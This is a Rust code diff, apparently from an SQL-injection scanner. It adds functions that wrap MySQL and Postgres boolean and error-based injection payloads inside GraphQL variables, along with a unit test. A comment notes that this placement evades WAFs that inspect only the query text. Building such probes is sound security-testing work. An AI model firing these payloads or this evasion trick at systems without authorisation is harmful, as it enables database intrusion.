@@ -136,6 +136,42 @@ pub fn json_payloads_for(dbms: Option<&str>) -> Vec<JsonPayload> {
     }
 }
 
+/// GraphQL variable envelope: wraps an error `PAYLOAD` so it rides inside
+/// `variables` instead of the query text (WAFs keyed on `query:` miss it,
+/// resolvers still interpolate it — cf. Praetorian 2024 GraphQL→Postgres
+/// `SQLi` via search-term argument).
+#[must_use]
+pub fn graphql_envelope(variable: &str, payload: &str) -> String {
+    format!(
+        "{{\"query\":\"query($v: String){{node(id: $v){{id}}}}\",\"variables\":{{\"{variable}\":\"{payload}\"}}}}"
+    )
+}
+
+/// One GraphQL variable probe per DBMS (mysql/postgres), built from the
+/// canonical error payloads. Additive: `json_payloads_for` ordering is
+/// untouched.
+#[must_use]
+pub fn graphql_probes_for(dbms: Option<&str>) -> Vec<JsonPayload> {
+    let mut out = Vec::new();
+    if dbms.is_none_or(|d| d == "mysql") {
+        out.push(JsonPayload::new(
+            graphql_envelope("id", "' OR JSON_EXTRACT('{\"k\":1}', '$.k')=1 -- -"),
+            graphql_envelope("id", "' OR JSON_EXTRACT('{\"k\":1}', '$.k')=2 -- -"),
+            graphql_envelope("id", &format!("' AND JSON_EXTRACT('{BAD_DOC}', '$') -- -")),
+            "mysql",
+        ));
+    }
+    if dbms.is_none_or(|d| d == "postgres") {
+        out.push(JsonPayload::new(
+            graphql_envelope("id", "' OR ('{\"k\":1}'::json->>'k')='1' --"),
+            graphql_envelope("id", "' OR ('{\"k\":1}'::json->>'k')='2' --"),
+            graphql_envelope("id", &format!("' AND ('{BAD_DOC}'::json->>'k')='1' --")),
+            "postgres",
+        ));
+    }
+    out
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -202,6 +238,26 @@ mod tests {
         assert!(kinds.contains(&"mysql"));
         assert!(kinds.contains(&"postgres"));
         assert!(kinds.contains(&"mssql"));
+    }
+
+    #[test]
+    fn graphql_probes_ride_in_variables() {
+        let v = graphql_probes_for(None);
+        assert_eq!(v.len(), 2);
+        for p in &v {
+            assert!(
+                p.true_payload.contains("\"variables\""),
+                "{}",
+                p.true_payload
+            );
+            assert!(p.error_payload.contains(BAD_DOC), "{}", p.error_payload);
+            assert_ne!(p.true_payload, p.false_payload);
+        }
+        assert_eq!(graphql_probes_for(Some("mysql")).len(), 1);
+        assert_eq!(graphql_probes_for(Some("mssql")).len(), 0);
+        let env = graphql_envelope("id", "PAYLOAD");
+        assert!(env.contains("\"query\""), "{env}");
+        assert!(env.contains("\"variables\""), "{env}");
     }
 
     #[test]
